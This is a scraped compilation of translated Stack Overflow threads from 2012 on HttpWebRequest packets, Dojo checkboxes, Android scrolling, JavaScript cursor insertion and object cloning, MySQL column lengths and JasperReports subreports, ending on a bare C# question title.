![Wireshark 重组截图](../Images/7a77869c6430b93e95fee3c3aca0b97a.png)

有谁知道它为什么这样做？似乎 HttpWebRequest 对象在写入其标头后正在流上调用 .Flush() 但我不确定它为什么会这样做？

我在这些上尝试了不同的组合：

```
ServicePointManager.UseNagleAlgorithm = false;
ServicePointManager.Expect100Continue = false; 
```

没有效果。

**编辑**

错误的：~~我进行了更深入的调查，当调用 HttpWebRequest.GetRequestStream() 时，它会立即将标头写入流。在您写入返回给您的 Stream 之前的某个阶段，网络会刷新这些（我猜？除非某处发生故意刷新）。当您最终开始写入流时，它已经发送了标头数据包。不知道如何防止这种情况，在调用 GetRequestStream() 的 HttpWebRequest 代码中似乎有一个非常硬的断言将写入标头。对于我的小请求，我希望在关闭流之前什么都不写，但这违背了流的本质。~~

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T10:43:55.527

答案是——不能用`WebHttpRequest`（因此`BasicHttpBinding`）

[http://us.generation-nt.com/answer/too-packets-httpwebrequest-help-23298102.html](http://us.generation-nt.com/answer/too-packets-httpwebrequest-help-23298102.html)

# checkbox - Dojo 功能在 IE8 上不起作用

> ID：13287287
> 
> 赞同：1
> 
> 时间：2012-11-08T10:35:09.900
> 
> 标签：checkbox, internet-explorer-8, dojo, cross-browser

我有一段代码可以使用单个主复选框（用作切换）来选择/取消选择所有 Dojo 复选框，该复选框**在 firefox 上运行良好，但在 IE8 上却不行**。我努力寻找问题，但一无所知，任何人都可以帮忙。我附上下面的代码：

```
 <script type="text/javascript">
    dojo.require("dojo.parser");

    dojo.ready(function() {
        var checkboxes = [];
        dojo.query('#waferCheck_cb input[type=checkbox]').forEach(function(node, index, arr){
        checkboxes.push(arr[index].id);
        var handle = dojo.connect(dijit.byId(arr[index].id), "onchange", function(evt){

            var cbClicked = evt.target.id;
            var cbStatus = dijit.byId(cbClicked).get("checked");
            setCBSelection(checkboxes,cbClicked,cbStatus );
            dojo.disconnect(handle);        
            });
        });
    });

    function setCBSelection(checkboxes,cb_Clicked, cb_Status) {
        var len = checkboxes.length;
        if(len > 0) {
            // get index of the checkbox clicked
            var cb_pos = 0;
            for(var i = 0; i < len; i++) {
                if(cb_Clicked == checkboxes[i]) {
                    cb_pos = i;
                    break;
                }
            }

            // If Select All checkbox clicked, set the other checboxes accordingly
            if(cb_pos == 0) {
                for(var i = 1; i < len; i++) {
                    dijit.byId(checkboxes[i]).set("checked", cb_Status);
                }
            } else {
                // If any other checkbox is clicked, set the Select All accordingly
                var allCBSameStatus = true;
                for(var i = 1; i < len; i++) {
                    var curCBStatus = dijit.byId(checkboxes[i]).get("checked");
                    if(curCBStatus != cb_Status) {
                        allCBSameStatus = false;
                        break;
                    };
                }
                if(allCBSameStatus){
                    dijit.byId(checkboxes[0]).set("checked", cb_Status)
                }else{
                    if(cb_Status == false) {
                        dijit.byId(checkboxes[0]).set("checked", cb_Status)
                    }
                }
            }
        }
    }
</script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T11:55:39.243

I believe IE8 doesn't like missing semicolons. I see 2 lines that are missing semicolons.

```
dijit.byId(checkboxes[0]).set("checked", cb_Status) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T07:25:41.950

您`function setCBSelection(...)`之前是否尝试过定义`dojo.ready(..)`（见下文）？也许这会有所帮助，因为它是在定义之前使用的？如果这没有帮助，如果您发布某种错误消息 IE 可能会抛出它可能会很有用......

```
 dojo.require("dojo.parser");

    function setCBSelection(checkboxes,cb_Clicked, cb_Status) {
        var len = checkboxes.length;
        if(len > 0) {
            // get index of the checkbox clicked
            var cb_pos = 0;
            for(var i = 0; i < len; i++) {
                if(cb_Clicked == checkboxes[i]) {
                    cb_pos = i;
                    break;
                }
            }

            // If Select All checkbox clicked, set the other checboxes accordingly
            if(cb_pos === 0) {
                for(i = 1; i < len; i++) {
                    dijit.byId(checkboxes[i]).set("checked", cb_Status);
                }
            } else {
                // If any other checkbox is clicked, set the Select All accordingly
                var allCBSameStatus = true;
                for(i = 1; i < len; i++) {
                    var curCBStatus = dijit.byId(checkboxes[i]).get("checked");
                    if(curCBStatus != cb_Status) {
                        allCBSameStatus = false;
                        break;
                    }
                }
                if(allCBSameStatus){
                    dijit.byId(checkboxes[0]).set("checked", cb_Status);
                }else{
                    if(cb_Status === false) {
                        dijit.byId(checkboxes[0]).set("checked", cb_Status);
                    }
                }
            }
        }
    }

    dojo.ready(function() {
        var checkboxes = [];
        dojo.query('#waferCheck_cb input[type=checkbox]').forEach(function(node, index, arr){
        checkboxes.push(arr[index].id);
        var handle = dojo.connect(dijit.byId(arr[index].id), "onchange", function(evt){

            var cbClicked = evt.target.id;
            var cbStatus = dijit.byId(cbClicked).get("checked");
            setCBSelection(checkboxes,cbClicked,cbStatus );
            dojo.disconnect(handle);        
            });
        });
    }); 
```

顺便说一句：您应该始终使用`===`与`0`或进行比较`false`...您可以使用[jsFiddle](http://jsfiddle.net) 让 JSLint 检查您的代码，从而发现许多一开始没有看到的问题。希望我能帮助你。

# android - 滚动到特定视图

> ID：13287293
> 
> 赞同：0
> 
> 时间：2012-11-08T10:35:20.027
> 
> 标签：android, android-layout, horizontalscrollview

我有家庭活动，我有 3 个按钮`Move To A`：`Move To B`和`Move To C`。

单击这些按钮后，我导航到内部活动，其中我在 a 中有 3 个布局`HorizontalScrollView`，比如`A`，`B`而`C`这些布局又包含几个视图。

现在我想要的是，内部活动应该导航到基于 Home 活动中单击的按钮的 3 个布局之一，即

如果`Move To A`按下主页活动，内部活动应该导航到布局`A`等等......

可能的解决方案可能是使用`ScrollTo()`，但它对于可变屏幕尺寸效率不高。

任何帮助表示赞赏。

## 编辑

这不起作用：

```
RelativeLayout LayoutA = (RelativeLayout) findViewById(R.id.LayoutA);
HorizontalScrollView main = (HorizontalScrollView) findViewById(R.id.scrollview);
main.scrollTo(PoCLayout.getLeft(), 0); 
```

即使这样也行不通：

```
main.scrollTo(500, 0); 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-11-08T11:14:13.580

如果`main.scrollTo(500,0)`不起作用，请尝试：

```
main.post(new Runnable() {
    @Override
    public void run() {
        main.scrollTo(500, 0);
    }
} 
```

**编辑：**按钮侦听器中的工作解决方案：

```
main.post(new Runnable() {
    @Override
    public void run() {
        main.scrollTo(layoutX.getLeft(), 0);
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-08T10:44:13.633

我不确定它是否会起作用，但您可以尝试调用该方法获取布局 A、B 或 C 的位置，`getLeft()`然后使用`scrollTo()`.
滚动到布局 A 的示例：`scrollTo(a.getLeft(), 0);`

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-08T10:45:05.910

你可以在这里做一点数学

使用`View.getLeft()`然后`View.getRight()`将计算出的宽度除以 2 以滚动到视图中心

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-07-19T19:56:06.670

采用 ：

```
final  HorizontalScrollView scrollView= (HorizontalScrollView) 
int speed=1000;
findViewById(R.id.main_scrollView);
final View view = findViewById(R.id.your_view); 
ViewTreeObserver vto = view.getViewTreeObserver();
vto.addOnGlobalLayoutListener(new ViewTreeObserver.OnGlobalLayoutListener() {
            @Override
            public void onGlobalLayout() { view.getViewTreeObserver().removeOnGlobalLayoutListener(this);   
                ObjectAnimator.ofInt(scrollView, "scrollY",  (int) view.getX()).setDuration(speed).start();
            }
        }); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-08-08T05:21:28.033

```
main.post(new Runnable() {
    @Override
    public void run() {
        main.scrollTo(500,500);
    }
} 
```

# javascript - 如何使用 javascript 更新文本框内光标位置的文本

> ID：13287294
> 
> 赞同：2
> 
> 时间：2012-11-08T10:35:29.337
> 
> 标签：javascript, asp.net, javascript-events

我正在 asp.net 中开发，屏幕上有一个文本框，光标位于应该添加一些文本的位置。

页面上存在一个按钮，或者至少它会这样做，并且当按下时会将文本插入到文本框中光标所在位置的文本框中，只有在该位置添加的关键字才会丢失文本光标。

这是否可以在 javascript 中使用，请记住我不知道除了 alert(''); 之外的任何 javascript；我明白当您单击按钮时，光标位置可能会丢失。

实际上会有七个小按钮，每个按钮都插入一个不同的字符串。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T10:46:58.993

是的，这是可能的。这是我们用来做您正在寻找的功能的功能

```
// myfield: the DOM element that you need to interact with
// myValue: the text to be instered
function insertAtCursor(myField, myValue) {
    //IE support
    if (document.selection) {
        myField.focus();
        sel = document.selection.createRange();
        sel.text = myValue;
    }
    //MOZILLA/NETSCAPE support
    else if (myField.selectionStart || myField.selectionStart == '0') {
        var startPos = myField.selectionStart;
        var endPos = myField.selectionEnd;
        myField.value = myField.value.substring(0, startPos)
        + myValue
        + myField.value.substring(endPos, myField.value.length);
    } else {
        myField.value += myValue;
    }
} 
```

您需要做的就是将您的文本框/文本区域作为第一个参数传递，并将文本作为第二个参数传递，然后 BOOM，它正在工作！

**更新：**一个活生生的例子：http: [//jsbin.com/owesik/1/edit](http://jsbin.com/owesik/1/edit)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T10:45:24.440

请参阅[此答案](https://stackoverflow.com/questions/263743/how-to-get-caret-position-in-textarea%20this%20answer)以获取一些指示。

简短的版本是“是的，至少在最近的浏览器中是可能的”。但是，您需要自学一些 JavaScript 才能使其正常工作。我个人推荐这本[在线书籍](http://eloquentjavascript.net/)（与作者无关）。

# javascript - javascript中的重复对象

> ID：13287297
> 
> 赞同：8
> 
> 时间：2012-11-08T10:35:45.637
> 
> 标签：javascript, object

我看到了两种复制对象的方法

1.

```
var a={c:1}
var b=a;
alert(b.c);//alert 1 
```

2.

```
var a={c:2};
var b={};
for (i in a)
{b[i]=a[i];} 
alert(b.c);//alert 1 
```

第一个比第二个短，那么第二个例子的效率是多少？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-11-08T10:39:32.840

在第一个版本中，您不会复制/克隆对象，只需对其进行额外引用：

```
var a = { a: 1 };
var b = a;
b.a = 2;

console.log(a.a); // 2; 
```

要克隆一个对象，有许多库可以为您做到这一点：

```
var b = $.extend({}, a); // Make a shallow clone (jQuery)
var b _.extend({}, a); // Make a shallow clone (underscore.js)

var b = $.extend(true, {}, a); // Make a deep clone (jQuery); 
```

或者您可以在本地进行：
简单克隆：

```
var b = {};
var prop;

for (prop in a) {
    b[prop] = a[prop];
} 
```

* * *

**深度克隆功能的草稿：**

```
function deepClone(obj) {
    var r;
    var i = 0,
    var len = obj.length;
    // string, number, boolean
    if (typeof obj !== "object") { 
        r = obj;
    }
    // Simple check for array
    else if ( len ) { 
        r = [];
        for ( ; i < len; i++ ) {
            r.push( deepClone(obj[i]) );
        }
    } 
    // Simple check for date
    else if ( obj.getTime ) { 
        r = new Date( +obj );
    }
    // Simple check for DOM node
    else if ( obj.nodeName ) { 
        r = obj;
    }
    // Object
    else { 
        r = {};
        for (i in obj) {
            r[i] = deepClone(obj[i]);
        }
    }

    return r;
} 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-11-08T10:39:00.750

第一个不创建副本，而只是复制引用，因此操作`a`后`b`指向同一个对象。

然而，在第二种情况下，每个属性都被单独复制，从而在其中创建对象的“真实”副本`a`（只要属性中只有原始类型，否则在更深层次上会遇到同样的问题）。

因此，在第一种情况下，如果您更改，`b.c`那么`a.c`也会更改，而在第二种情况下则不会。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-11-08T11:10:08.773

正如其他人在这里所说：第一个分配，为现有对象分配一个新引用，第二个执行*浅拷贝*。*浅*
我的意思是：只会复制基础对象，没有递归：

 *```
var a = {some:'propery',
         another:{might:'be',
                  an: 'object, too'}
        };
var b = {};
for(var p in a)
{
    b[p] = a[p];
}
b.some = 'b\'s own property';
console.log(a.some);//property -> unaltered
console.log(b.some);//b's own property --> separate entities
b.another.might = 'foo';
console.log(a.another.might);//foo ==> b.another references a.another 
```

为了解决这个问题，你会认为一个简单的递归函数就足够了：

```
var cloneObj = function(o)
{
    var p,r = {};
    for (p in o)
    {//omitting checks for functions, date objects and the like
        r[p] = (o[p] instanceof Object ? cloneObj(o[p]) : o[p]);
    }
}; 
```

但要厌倦*循环引用*！

```
//assume a is the same object as above
a._myself = a;//<- a references itself 
```

这将产生无休止的递归，也就是死锁场景，除非您针对这种情况添加检查：

```
var cloneObj = function(o)
{
    var p,r = {};
    for (p in o)
    {//Needs a lot more work, just a basic example of a recursive copy function
        switch(true)
        {
            case o[p] instanceof Function:
                r[p] = o[p];
            break;
            case o[p] instanceof Date:
                r[p] = new Date(o[p]);
            break;
            case o === o[p]:
            //simple circular references only
            //a.some.child.object.references = a; will still cause trouble
                r[p] = r;
            break;
            case o[p] instanceof Array:
                r[p] = o[p].slice(0);//copy arrays
            break;
            default:
                r[p] = o[p] instanceof Object ? cloneObj(o[p]) : o[p];
        }
    }
    return r;
}; 
```

现在，这非常冗长，并且在大多数情况下完全过分，如果您想要的是两个具有相同数据但可以独立更改的对象（即不要在内存中引用相同的对象），那么您只需要 1 行代码：

```
var a = {some:'propery',
         another:{might:'be',
                  an: 'object, too'}
        };
var b = JSON.parse(JSON.stringify(a)); 
```

底线：分配引用肯定更有效：它不需要第二次调用对象构造函数，也不需要任何常量的额外副本。
缺点是：您最终得到一个对象，并且可能会无意中更改/删除您认为在使用其他引用时仍然存在的东西（`delete b.some;/*some time later*/a.some.replace(/p/g,'q');//<--error`）

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-11-08T10:39:20.660

第一个复制引用并且***不复制***对象，第二个创建一个新引用然后复制成员（反过来，如果它们是引用将只复制引用）。

您可能想查看其他 SO - [Javascript 是否等于号引用对象或克隆它们？](https://stackoverflow.com/questions/7467335/does-javascript-equal-sign-reference-objects-or-clones-them)

这不是效率问题，最终是关于正确性的问题。如果您需要在不同的代码块之间共享对对象的引用（例如，以便多段代码可以共享同一个对象），那么您只需依赖 javascript 通过引用传递的事实。

但是，如果您需要在方法之间复制一个对象 - 那么您可以在第二个代码块中使用您的简单示例（如果您的对象中没有其他“对象”），否则您可能必须实现深度克隆（请参阅[How to Deep clone in javascript](https://stackoverflow.com/questions/4459928/how-to-deep-clone-in-javascript)，并注意那里的答案 - 这不是一件小事）。*

# ipad - uiscrollbar 不滚动

> ID：13287298
> 
> 赞同：0
> 
> 时间：2012-11-08T10:35:49.897
> 
> 标签：ipad, uiscrollview

我为横向视图实现了一个滚动条：

```
//Add scrollview
    scrollview=[[UIScrollView alloc]initWithFrame:CGRectMake(0,0,1024,768)];
    scrollview.delegate = self;
    scrollview.showsVerticalScrollIndicator=YES;
    scrollview.scrollEnabled=YES;
    scrollview.userInteractionEnabled=YES;
    scrollview.contentOffset = CGPointMake(0, 0);
    scrollview.contentSize = CGSizeMake(1024,2000);
    [self.view addSubview:scrollview]; 
```

// 将子视图添加到滚动视图

```
[self generateSubtaskElements:allObjects]; 
```

我试图更改 contentSize，但没有任何反应。我无法欣赏美景。

# mysql - 为什么我们在 MYSQL 中限制列值的长度

> ID：13287300
> 
> 赞同：6
> 
> 时间：2012-11-08T10:36:03.727
> 
> 标签：mysql, database

当我们为我们的应用程序创建数据库时，我们限制了数据库列的长度。

例子 -

1.  字符串 (200)
2.  整数 (5)

ETC

对速度有任何影响或一些影响吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-08T10:56:00.190

首先，不限制“数据库”的长度。相反，确实限制了数据库中表列的大小。

你问我们为什么要这样做？

1.  我们不想为永远不会使用它的数据浪费任何空间（这就是 varchar、varbinary 等的用途）。
2.  这是一种最佳实践，因为它迫使您在实际使用数据结构之前考虑它。
3.  数据越少，应用程序的处理速度就越快（这是一个重言式）。
4.  如果您确切知道允许占用多少空间，则可以更轻松地验证您的数据。
5.  全文索引在大小受限时会大大增加

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T10:42:38.767

我能想到的一个原因是，当您没有指定列数据类型的长度时，MYsql 引擎会假定一个默认长度值，该值可能比存储在其中的实际数据的长度大很多柱子。因此，永远不要忽略列的长度属性始终是最佳实践。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T10:50:30.660

限制数据库字段的长度可确保数据的验证，您不会得到任何超出指定长度的意外数据。此外，某些字段无法索引，例如 LONG，因此请适当且明智地选择。就性能而言，影响可以忽略不计。您还需要考虑数据本身，例如以 UTF-8 等 unicode 编码存储数据可能会增加存储要求。

# jasper-reports - jasperReport/iReport 子报表显示空白（不显示）

> ID：13287302
> 
> 赞同：20
> 
> 时间：2012-11-08T10:36:15.800
> 
> 标签：jasper-reports, ireport

我正在尝试使用 iReport 设计器（均具有**空数据源**）从主报告（ ***report1.jrxml*** **）创建子报告（ report1_subreport3.jrxml**）。主报表**详细信息带**包含静态文本（**“主报表”**）和子报表元素，子报表在其相应的详细信息带（**“子报表”**）中包含静态文本

 *******但是单击**主报表**的预览选项卡仅显示静态文本“主报表” **，不显示子报表的静态文本**（“子报表”）。

我还浏览了链接[http://community.jaspersoft.com/questions/524978/empty-subreport-xml-datasource-ireport](https://i.stack.imgur.com/fKyKW.jpg)但仍然面临问题。

下面是**report1.jrxml**

```
<?xml version="1.0" encoding="UTF-8"?>
<jasperReport xmlns="http://jasperreports.sourceforge.net/jasperreports" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://jasperreports.sourceforge.net/jasperreports http://jasperreports.sourceforge.net/xsd/jasperreport.xsd" name="report1" language="groovy" pageWidth="595" pageHeight="842" columnWidth="555" leftMargin="20" rightMargin="20" topMargin="20" bottomMargin="20" uuid="20036b98-ef64-4dea-8345-b89bcd8f2671">
    <property name="ireport.zoom" value="1.0"/>
    <property name="ireport.x" value="0"/>
    <property name="ireport.y" value="68"/>
    <parameter name="SUBREPORT_DIR" class="java.lang.String" isForPrompting="false">
        <defaultValueExpression><![CDATA["D:\\soapReport\\jasperReport\\"]]></defaultValueExpression>
    </parameter>
    <background>
        <band splitType="Stretch"/>
    </background>
    <title>
        <band height="79" splitType="Stretch"/>
    </title>
    <pageHeader>
        <band height="35" splitType="Stretch"/>
    </pageHeader>
    <columnHeader>
        <band height="61" splitType="Stretch"/>
    </columnHeader>
    <detail>
        <band height="125" splitType="Stretch">
            <staticText>
                <reportElement uuid="d49ee6bf-1a13-41bb-9feb-f0fb2ec414f2" x="71" y="28" width="100" height="20"/>
                <textElement/>
                <text><![CDATA[Main Report]]></text>
            </staticText>
            <subreport>
                <reportElement uuid="364d3c38-a0a1-4fa5-b0bf-12b22314ac5e" x="311" y="14" width="200" height="100"/>
                <connectionExpression><![CDATA[$P{REPORT_CONNECTION}]]></connectionExpression>
                <subreportExpression><![CDATA[$P{SUBREPORT_DIR} + "report1_subreport3.jasper"]]></subreportExpression>
            </subreport>
        </band>
    </detail>
    <columnFooter>
        <band height="45" splitType="Stretch"/>
    </columnFooter>
    <pageFooter>
        <band height="54" splitType="Stretch"/>
    </pageFooter>
    <summary>
        <band height="42" splitType="Stretch"/>
    </summary>
</jasperReport> 
```

以下是***report1_subreport3.jrxml***

```
<?xml version="1.0" encoding="UTF-8"?>
<jasperReport xmlns="http://jasperreports.sourceforge.net/jasperreports" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://jasperreports.sourceforge.net/jasperreports http://jasperreports.sourceforge.net/xsd/jasperreport.xsd" name="report1_subreport3" language="groovy" pageWidth="555" pageHeight="802" columnWidth="555" leftMargin="0" rightMargin="0" topMargin="0" bottomMargin="0" uuid="7ca2d973-972c-4c56-8d5e-503b32b4afc6">
    <property name="ireport.zoom" value="1.0"/>
    <property name="ireport.x" value="0"/>
    <property name="ireport.y" value="0"/>
    <background>
        <band splitType="Stretch"/>
    </background>
    <title>
        <band height="79" splitType="Stretch"/>
    </title>
    <pageHeader>
        <band height="35" splitType="Stretch"/>
    </pageHeader>
    <columnHeader>
        <band height="61" splitType="Stretch"/>
    </columnHeader>
    <detail>
        <band height="125" splitType="Stretch">
            <staticText>
                <reportElement uuid="5f488fe4-f9f7-4f12-9c1e-812661026bd7" x="222" y="50" width="100" height="20"/>
                <textElement/>
                <text><![CDATA[Sub Report]]></text>
            </staticText>
        </band>
    </detail>
    <columnFooter>
        <band height="45" splitType="Stretch"/>
    </columnFooter>
    <pageFooter>
        <band height="54" splitType="Stretch"/>
    </pageFooter>
    <summary>
        <band height="42" splitType="Stretch"/>
    </summary>
</jasperReport> 
```

在此先感谢您提供的任何帮助...

* * *

感谢 Gopi 的更改，但***它仍然在*** **subreport**的位置显示空白。**以下是主要报道**

```
<?xml version="1.0" encoding="UTF-8"?>
<jasperReport xmlns="http://jasperreports.sourceforge.net/jasperreports" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://jasperreports.sourceforge.net/jasperreports http://jasperreports.sourceforge.net/xsd/jasperreport.xsd" name="report1" pageWidth="595" pageHeight="842" columnWidth="555" leftMargin="20" rightMargin="20" topMargin="20" bottomMargin="20" uuid="748f862c-3467-4c8c-89f6-04a571192482">
    <property name="ireport.zoom" value="1.0"/>
    <property name="ireport.x" value="0"/>
    <property name="ireport.y" value="0"/>
    <parameter name="SUBREPORT_DIR" class="java.lang.String" isForPrompting="false">
        <defaultValueExpression><![CDATA["D:/soapReport/jasperReport/"]]></defaultValueExpression>
    </parameter>
    <queryString>
        <![CDATA[]]>
    </queryString>
    <background>
        <band splitType="Stretch"/>
    </background>
    <title>
        <band height="79" splitType="Stretch"/>
    </title>
    <pageHeader>
        <band height="35" splitType="Stretch"/>
    </pageHeader>
    <columnHeader>
        <band height="61" splitType="Stretch"/>
    </columnHeader>
    <detail>
        <band height="71" splitType="Stretch">
            <staticText>
                <reportElement uuid="17f2cfc8-497a-4676-b83a-acf55bccac04" x="33" y="15" width="100" height="20"/>
                <textElement/>
                <text><![CDATA[Main Report]]></text>
            </staticText>
        </band>
    </detail>
    <columnFooter>
        <band height="134" splitType="Stretch">
            <subreport>
                <reportElement uuid="40f53bea-c9eb-46a7-b4fc-3d592da3ef90" x="234" y="17" width="200" height="100"/>
                <connectionExpression><![CDATA[$P{REPORT_CONNECTION}]]></connectionExpression>
                <subreportExpression><![CDATA["D:/soapReport/jasperReport/report1_subreport1.jasper"]]></subreportExpression>
            </subreport>
        </band>
    </columnFooter>
    <pageFooter>
        <band height="54" splitType="Stretch"/>
    </pageFooter>
    <summary>
        <band height="42" splitType="Stretch"/>
    </summary>
</jasperReport> 
```

**下面是子报告**

```
<?xml version="1.0" encoding="UTF-8"?>
<jasperReport xmlns="http://jasperreports.sourceforge.net/jasperreports" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://jasperreports.sourceforge.net/jasperreports http://jasperreports.sourceforge.net/xsd/jasperreport.xsd" name="report1_subreport1" language="groovy" pageWidth="555" pageHeight="802" whenNoDataType="AllSectionsNoDetail" columnWidth="555" leftMargin="0" rightMargin="0" topMargin="0" bottomMargin="0" uuid="62bf7fb7-8145-4aa6-b963-c98eefac9862">
    <property name="ireport.zoom" value="1.0"/>
    <property name="ireport.x" value="0"/>
    <property name="ireport.y" value="0"/>
    <background>
        <band splitType="Stretch"/>
    </background>
    <columnHeader>
        <band height="61" splitType="Stretch">
            <staticText>
                <reportElement uuid="9bf9eafc-c1e0-49fa-8bb8-ed6c496498da" x="213" y="20" width="100" height="20"/>
                <textElement/>
                <text><![CDATA[Sub Report]]></text>
            </staticText>
        </band>
    </columnHeader>
</jasperReport> 
```

如果我遗漏了什么，请帮助我...

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-11-08T11:34:58.547

将您的子报告字段放在除详细信息带之外的任何其他带中，然后添加 `whenNoDataType="AllSectionsNoDetail"`到您的 xml 文件中。将其添加到标记
中的其他报告属性中。您也可以使用 GUI 设计器添加。打开您的子报告并在属性编辑器中，在选项末尾您会找到选项。从可用选项列表中选择 。**主报告：**`<JasperReport>`

`When No Data``All Sections with No Detail`

 **```
<?xml version="1.0" encoding="UTF-8"?>
<jasperReport xmlns="http://jasperreports.sourceforge.net/jasperreports" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://jasperreports.sourceforge.net/jasperreports http://jasperreports.sourceforge.net/xsd/jasperreport.xsd" name="report1" pageWidth="595" pageHeight="842" columnWidth="555" leftMargin="20" rightMargin="20" topMargin="20" bottomMargin="20">
<property name="ireport.zoom" value="1.0"/>
<property name="ireport.x" value="0"/>
<property name="ireport.y" value="12"/>
<parameter name="SUBREPORT_DIR" class="java.lang.String" isForPrompting="false">
    <defaultValueExpression><![CDATA["/home/qualian/Desktop/gopi/prjreport/"]]></defaultValueExpression>
</parameter>
<queryString>
    <![CDATA[]]>
</queryString>
<background>
    <band splitType="Stretch"/>
</background>
<title>
    <band height="79" splitType="Stretch"/>
</title>
<pageHeader>
    <band height="35" splitType="Stretch"/>
</pageHeader>
<columnHeader>
    <band height="61" splitType="Stretch"/>
</columnHeader>
<detail>
    <band height="125" splitType="Stretch">
        <subreport>
            <reportElement x="33" y="56" width="208" height="36"/>
            <connectionExpression><![CDATA[$P{REPORT_CONNECTION}]]></connectionExpression>
            <subreportExpression class="java.lang.String"><![CDATA[$P{SUBREPORT_DIR}+"report3_subreport1.jasper"]]></subreportExpression>
        </subreport>
        <staticText>
            <reportElement x="33" y="15" width="100" height="20"/>
            <textElement/>
            <text><![CDATA[Main Report]]></text>
        </staticText>
    </band>
</detail>
<columnFooter>
    <band height="45" splitType="Stretch"/>
</columnFooter>
<pageFooter>
    <band height="54" splitType="Stretch"/>
</pageFooter>
<summary>
    <band height="42" splitType="Stretch"/>
</summary> 
```

**子报告：**

```
<?xml version="1.0" encoding="UTF-8"?>
<jasperReport xmlns="http://jasperreports.sourceforge.net/jasperreports" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://jasperreports.sourceforge.net/jasperreports http://jasperreports.sourceforge.net/xsd/jasperreport.xsd" name="report1_subreport3" language="groovy" pageWidth="555" pageHeight="802" whenNoDataType="AllSectionsNoDetail" columnWidth="555" leftMargin="0" rightMargin="0" topMargin="0" bottomMargin="0">
<property name="ireport.zoom" value="1.0"/>
<property name="ireport.x" value="0"/>
<property name="ireport.y" value="0"/>
<background>
    <band splitType="Stretch"/>
</background>
<columnHeader>
    <band height="40" splitType="Stretch">
        <staticText>
            <reportElement x="107" y="12" width="100" height="20"/>
            <textElement/>
            <text><![CDATA[Sub Report]]></text>
        </staticText>
    </band>
</columnHeader> 
```

这就像一个魅力。希望这可以帮助。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2016-12-15T15:38:21.587

上述问题已使用我包含在我的主报告中的以下标签解决。我们需要使用空数据源（new net.sf.jasperreports.engine.JREmptyDataSource()）

SUBREPORT.jrxml

```
<?xml version="1.0" encoding="UTF-8"?>
<!-- Created with Jaspersoft Studio version 6.3.1.final using     JasperReports Library version 6.3.1  -->
<!-- 2016-12-15T10:33:58 -->
<jasperReport xmlns="http://jasperreports.sourceforge.net/jasperreports" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://jasperreports.sourceforge.net/jasperreports http://jasperreports.sourceforge.net/xsd/jasperreport.xsd" name="HYPERLINKS_SUBREPORT" pageWidth="595" pageHeight="842" columnWidth="595" leftMargin="0" rightMargin="0" topMargin="0" bottomMargin="0" uuid="ad9606b1-969d-4340-a7eb-61dc30ec8f0d">
<property name="com.jaspersoft.studio.data.defaultdataadapter" value="One Empty Record"/>
<property name="com.jaspersoft.studio.unit." value="pixel"/>
<property name="com.jaspersoft.studio.unit.pageHeight" value="pixel"/>
<property name="com.jaspersoft.studio.unit.pageWidth" value="pixel"/>
<property name="com.jaspersoft.studio.unit.topMargin" value="pixel"/>
<property name="com.jaspersoft.studio.unit.bottomMargin" value="pixel"/>
<property name="com.jaspersoft.studio.unit.leftMargin" value="pixel"/>
<property name="com.jaspersoft.studio.unit.rightMargin" value="pixel"/>
<property name="com.jaspersoft.studio.unit.columnWidth" value="pixel"/>
<property name="com.jaspersoft.studio.unit.columnSpacing" value="pixel"/>
<queryString>
    <![CDATA[]]>
</queryString>
<detail>
    <band height="82" splitType="Stretch">
        <staticText>
            <reportElement x="16" y="47" width="100" height="30" uuid="866e60e7-16a0-4fea-b56f-ca4143e98fec"/>
            <text><![CDATA[Testing text]]></text>
        </staticText>
    </band>
</detail> 
```

main_report.jrxml 的 XML

```
 <subreport>
            <reportElement positionType="Float" x="0" y="220" width="200" height="60" uuid="62463158-73b1-4089-b66c-633d3a987649"/>
            <dataSourceExpression><![CDATA[new net.sf.jasperreports.engine.JREmptyDataSource()]]></dataSourceExpression>
            <subreportExpression><![CDATA["SUBREPORT.jasper"]]></subreportExpression>
        </subreport> 
```

**使用 Jaspersoft Studio 也可以实现相同的目的。**

[![在此处输入图像描述](../Images/4a9b3566f879a81801ff39d3e7425713.png)](https://i.stack.imgur.com/dCvnl.jpg)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-07-08T15:41:29.273

任何对 jasper reports studio 6.3.0 不显示子报表有问题的人都应该尝试更改子报表中的参数名称，然后更新主报表子报表小部件“编辑参数”选项中的参数连接以匹配新参数名称。也可以避免下划线即。“用户身份”。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2022-01-31T00:04:32.843

在我的情况下，问题是由 JasperReportStudio 在保存子报告后未构建 .jasper 文件引起的。这导致主报告总是包含我创建的子报告的第一个版本（它有一些错误，所以没有显示任何东西）。

解决方法是每次保存后按Ctrl-S再按Ctrl-B。这会重建子报表 .jasper 文件并导致它在主报表的预览中正确刷新。*********

# c# - 在文本中查找字符串，删除第一个和最后一个字符
